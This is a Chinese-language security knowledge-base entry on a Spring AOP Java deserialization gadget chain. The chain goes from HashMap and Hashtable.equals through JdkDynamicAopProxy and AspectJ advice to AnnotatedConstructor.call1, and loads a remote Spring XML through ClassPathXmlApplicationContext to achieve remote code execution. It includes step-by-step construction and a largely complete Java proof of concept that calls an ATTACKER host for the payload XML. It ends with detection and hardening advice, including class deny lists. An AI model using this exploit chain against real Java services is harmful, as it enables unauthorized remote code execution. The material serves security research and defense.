---
id: web-java-deserialization-spring-aop-parameterized-advice-gadget
title: Spring AOP 有参调用 gadget：AspectJAdvice + JdkDynamicAopProxy 经 Hashtable.equals 触发 Map.get
type: scenario
domain: web
path: web/java/deserialization
technique: spring-aop-parameterized-advice-gadget
tags:
- java
- deserialization
- spring
- aop
- gadget
- jdk-proxy
- hashtable
- classpathxmlapplicationcontext
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:38:26+08:00'
  notes: 已对照原文与11张图核对：链为 HashMap(Hashtable key) -> AbstractMap.equals 先 t.size() 后 t.get() -> JdkDynamicAopProxy 代理 get -> AspectJAfterReturningAdvice(setReturningName arg)+RegexpMethodPointcutAdvisor(.*get)+双层代理 -> AnnotatedConstructor.call1 -> ClassPathXmlApplicationContext 加载远程 XML；图10 计算器、图11 服务器收到 GET /spel.xml 证明打通。原文未给出 Spring/JDK 具体版本与远程 SpEL XML 内容；PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deserialization-spring-aop-parameterized-advice-gadget/
draft: false
kb_aliases:
- Spring AOP 有参利用链
- AspectJAroundAdvice gadget
- AspectJAfterReturningAdvice gadget
- JdkDynamicAopProxy 反序列化
- RegexpMethodPointcutAdvisor 绕过 size
- AnnotatedConstructor.call1
- Spring AOP 反序列化链
---

## 一句话结论

在 classpath 含 Spring AOP/Context 与 Jackson databind 的 Java 应用中，可构造一条反序列化 gadget：`HashMap.readObject` 触发 `Hashtable.equals`，`AbstractMap.equals` 调用代理 Map 的 `get`，代理由 `JdkDynamicAopProxy` + `AspectJAfterReturningAdvice` 组成，最终以可控参数调用 `AnnotatedConstructor.call1(Object)`，把参数传给 `ClassPathXmlApplicationContext(String)` 加载远程 Spring XML（SpEL）实现 RCE。

## 原理

- 常见 Spring AOP 无参链只能触发 getter/无参方法，无法把攻击者控制的参数传给 sink。有参链的关键是让 AOP advice 调用一个“接受一个 Object 参数”的方法，并让该参数成为最终构造函数的参数。
- sink 选择 `com.fasterxml.jackson.databind.introspect.AnnotatedConstructor#call1(Object)`：
  ```java
  public final Object call1(Object arg) throws Exception {
      return _constructor.newInstance(arg);
  }
  ```
  只要把 `_constructor` 设为 `ClassPathXmlApplicationContext(String.class)`，`call1(url)` 就会用该 URL 构造 Spring 上下文，加载远程 XML（可含 SpEL）实现 RCE。
- 触发链：
  - `HashMap.readObject` 重建哈希表时会对 key 调用 `hashCode`/`equals`；
  - 将 `Hashtable` 作为 key 之一，`HashMap` 在冲突/比较时调用 `Hashtable.equals`；
  - `Hashtable` 继承的 `AbstractMap.equals` 会先比较 `t.size() != size()`，再遍历自身条目调用 `t.get(key)`；
  - 若 `t` 是恶意动态代理（实现 `Map`），`get` 就会进入 `JdkDynamicAopProxy.invoke`，被 AOP advisor 拦截并执行 advice。
- AOP 组件：
  - `AspectJAfterReturningAdvice(Method method, Pointcut pointcut, AspectInstanceFactory factory)`：`method` 为 `AnnotatedConstructor.call1(Object.class)`，factory 为 `SingletonAspectInstanceFactory(an)`（返回恶意 `AnnotatedConstructor` 实例）。
  - `AfterReturningAdviceInterceptor` 包装上述 advice；`advice.setReturningName("arg")` 把 `call1` 的参数名 `arg` 绑定为返回值/参数，确保有参调用能正确传参。
  - `RegexpMethodPointcutAdvisor` 设置 `pattern = ".*get"`，只对 `get` 方法织入 advice，避免 `size()`、`hashCode()` 等调用也进入 advice。
- 两个关键坑：
  1. `AbstractMap.equals` 在 `get` 之前会调用 `t.size()`；若代理 target 是 `AnnotatedConstructor`，它没有 `size()`，链会提前报错。解法：把代理 target 设为一个 `Hashtable`（或再套一层代理），让 `size()` 正常返回；真正的 sink 仍由 `SingletonAspectInstanceFactory` 返回的 `AnnotatedConstructor` 执行。
  2. `JdkDynamicAopProxy` 的 `hashCodeDefined` 字段需要设为 `true`，避免 `hashCode` 走短路分支导致哈希/比较行为不符合预期；通过反射设置。
- 为什么要有参：无参链只能调用 getter/无参构造，利用面窄；有参链可以把 URL、文件路径、命令等参数直接传给 sink，尤其适合写文件、加载远程配置等不出网/半出网场景。

## 触发条件

- 目标使用 Java 原生反序列化（`ObjectInputStream.readObject`）处理不可信数据。
- classpath 含 `spring-aop`、`spring-context`、`spring-beans`、`aspectjweaver` 等 Spring AOP/Context 依赖，以及 `jackson-databind`（提供 `AnnotatedConstructor`）。
- 目标可访问攻击者的远程 Spring XML（或使用本地文件/其它单参 sink）。
- 反序列化过滤器未拦截 Spring AOP、Jackson introspect、`ClassPathXmlApplicationContext` 等类；或过滤器存在可绕过的 allowlist 缺陷。
- JDK/Spring 版本与 gadget 字段/构造兼容（`_constructor`、`_parser` 等字段名可能随版本变化）。

## 利用步骤

1. 确认反序列化入口与 classpath（Spring AOP/Context、Jackson、aspectjweaver）。
2. 用 `Unsafe.allocateInstance` 创建 `AnnotatedConstructor`（避免调用其构造函数），反射设置 `_constructor` 为 `ClassPathXmlApplicationContext(String.class)`。
3. 取 `AnnotatedConstructor#call1(Object.class)` 方法对象。
4. 构造 `AspectJAfterReturningAdvice(call1, pointcut, new SingletonAspectInstanceFactory(an))`，`setReturningName("arg")`，再用 `AfterReturningAdviceInterceptor` 包装。
5. 构造 `RegexpMethodPointcutAdvisor(advice)`，`setPattern(".*get")`。
6. 构造内层 `AdvisedSupport`：target 设为 `Hashtable`，添加 `ExposeInvocationInterceptor` 与上述 advisor；用 `JdkDynamicAopProxy` + `Proxy.newProxyInstance` 生成实现 `AopProxy, Map` 的内层代理。
7. 构造外层 `AdvisedSupport`：target 设为内层代理，添加同一 advisor；生成外层代理，并反射把 `hashCodeDefined` 设为 `true`。
8. 构造 `HashMap`：放入 `"aaa" -> "test"` 与 `Hashtable t -> "test"`；反射把 `"aaa"` 对应的 key 替换为外层代理；`t` 中放入远程 XML URL。
9. 序列化后在目标端反序列化；`HashMap` 重建时触发 `Hashtable.equals` → 代理 `get` → advice → `call1(url)` → `ClassPathXmlApplicationContext` 加载远程 XML。

## PoC

核心构造（省略 import、异常处理与完整工具方法）：

```java
AnnotatedConstructor an = (AnnotatedConstructor) createObjWithoutConstructor(AnnotatedConstructor.class);
Constructor<?> con = Class.forName("org.springframework.context.support.ClassPathXmlApplicationContext")
        .getConstructor(String.class);
setFieldValue(an, "_constructor", con);
Method call1 = an.getClass().getDeclaredMethod("call1", Object.class);

AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();
SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(an);

AspectJAfterReturningAdvice advice =
        new AspectJAfterReturningAdvice(call1, pointcut, factory);
advice.setReturningName("arg");                     // 关键：有参绑定
AfterReturningAdviceInterceptor interceptor = new AfterReturningAdviceInterceptor(advice);

RegexpMethodPointcutAdvisor advisor = new RegexpMethodPointcutAdvisor(interceptor);
advisor.setPattern(".*get");                        // 只拦截 get，放过 size/hashCode

Constructor<?> proxyCtor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
        .getDeclaredConstructor(AdvisedSupport.class);
proxyCtor.setAccessible(true);

// 内层代理：target 为 Hashtable，提供 size()
Hashtable<Object, Object> t = new Hashtable<>();
AdvisedSupport innerSupport = new AdvisedSupport();
innerSupport.setTarget(t);
innerSupport.addAdvice(ExposeInvocationInterceptor.INSTANCE); // 或反射构造
innerSupport.addAdvisor(advisor);
Object innerProxy = getProxy(proxyCtor, innerSupport, new Class[]{AopProxy.class, Map.class});

// 外层代理：target 为内层代理
AdvisedSupport outerSupport = new AdvisedSupport();
outerSupport.setTarget(innerProxy);
outerSupport.addAdvisor(advisor);
Object outerProxy = getProxy(proxyCtor, outerSupport, new Class[]{AopProxy.class, Map.class});

t.put("http://ATTACKER:6666/spel.xml", "x");         // 最终传给 ClassPathXmlApplicationContext 的参数

HashMap<Object, Object> map = new HashMap<>();
map.put("aaa", "test");
map.put(t, "test");

// 反射把 "aaa" 的 key 替换为 outerProxy（避免重新 hash）
replaceKey(map, "aaa", outerProxy);

// 序列化/反序列化触发
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("ser.ser"));
out.writeObject(map);
out.close();
new ObjectInputStream(new FileInputStream("ser.ser")).readObject();
```

```java
public static Object getProxy(Constructor<?> ctor, AdvisedSupport advised, Class<?>[] ifaces) throws Exception {
    InvocationHandler handler = (InvocationHandler) ctor.newInstance(advised);
    Field f = handler.getClass().getDeclaredField("hashCodeDefined");
    f.setAccessible(true);
    f.set(handler, true);                            // 关键：避免 hashCode 短路
    return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), ifaces, handler);
}

public static <T> T createObjWithoutConstructor(Class<T> clazz) throws Exception {
    Field f = Unsafe.class.getDeclaredField("theUnsafe");
    f.setAccessible(true);
    return (T) ((Unsafe) f.get(null)).allocateInstance(clazz);
}
```

远程 `spel.xml`（示意，需按 Spring 版本构造可执行 SpEL 的 bean 定义）：

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <!-- 通过 SpEL 调用 Runtime/ProcessBuilder 执行命令 -->
</beans>
```

说明：

- 原文用 `ClassPathXmlApplicationContext(String)` 作为单参构造函数 sink，参数就是 `t` 中的 URL；服务器日志可见目标请求 `/spel.xml`，本地弹出计算器，证明链打通。
- 第一次尝试用 `AspectJAroundAdvice` + `DefaultIntroductionAdvisor` 会在 `Hashtable.size()` 阶段提前进入 advice 并因 `AnnotatedConstructor` 无 `size()` 失败；最终方案改用 `RegexpMethodPointcutAdvisor(".*get")` + 内层 Hashtable 代理 + 外层代理。
- `ExposeInvocationInterceptor` 可通过反射构造（其构造函数非 public），或使用 `ExposeInvocationInterceptor.INSTANCE`（视版本）。
- 不同 Spring 版本的 `JdkDynamicAopProxy` 字段（`hashCodeDefined`）、`AspectJAfterReturningAdvice` 构造、`SimpleWebHandlerParser` 等可能有差异，需按目标版本调整。

## 变体与关联

- 变体：sink 换成任意“单参构造/单参方法”，如 `FileOutputStream(String)`（可打开文件）、`URLClassLoader`、其它 Spring Context 构造；参数由 `Hashtable` 的 key 控制。
- 变体：触发点换成 `HashMap`/`Hashtable` 的 `equals`、`XString.equals`、`HotSwappableTargetSource` 等；参见 [[web-java-deserialization-jdk-xstring-equals-tostring]]。
- 变体：使用 `AspectJAroundAdvice` 而非 `AfterReturningAdviceInterceptor` 时，需要解决 size/hashCode 短路与参数绑定，难度更高。
- 关联：[[web-java-deser-hessian-jndi-outbound-chains]]（Hessian 场景下的 Spring AOP/JNDI 链）。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（无参/ TemplatesImpl 链的对比）。
- 边界：classpath 缺少 Spring AOP/Context 或 Jackson databind、反序列化过滤器拦截相关类、字段/构造随版本变化、目标不能出网加载远程 XML 时，链会失效（可改用本地文件或其它 sink）。

## 检测与防御

- 修复：不要对不可信数据使用 Java 原生反序列化；改用 JSON/Protobuf 等安全格式并做严格类型绑定。
- 加固：使用 `ObjectInputFilter`（JEP 290）做类白名单，拒绝 `org.springframework.aop.*`、`com.fasterxml.jackson.databind.introspect.AnnotatedConstructor`、`ClassPathXmlApplicationContext`、`JdkDynamicAopProxy` 等 gadget 类；或使用序列化过滤器（如 SerialKiller、Contrast）。
- 加固：移除业务不需要的 Spring AOP/Context、Jackson databind、aspectjweaver 依赖，缩小 gadget 面；升级 Spring/Jackson 到安全版本。
- 检测：反序列化流量中出现 `AC ED 00 05` 且包含上述类名；应用外连 `/spel.xml` 等远程 Spring XML；`ClassPathXmlApplicationContext` 构造、`AnnotatedConstructor.call1`、`JdkDynamicAopProxy` 反序列化等异常调用栈。
- 检测：监控 `Hashtable.equals`/`HashMap.readObject` 触发的代理 `get` 调用、动态代理类加载、以及反序列化后的远程 HTTP 请求。
- 响应：隔离/下线受影响应用，排查反序列化入口、classpath 与远程 XML 地址，清理恶意序列化数据与落地文件。
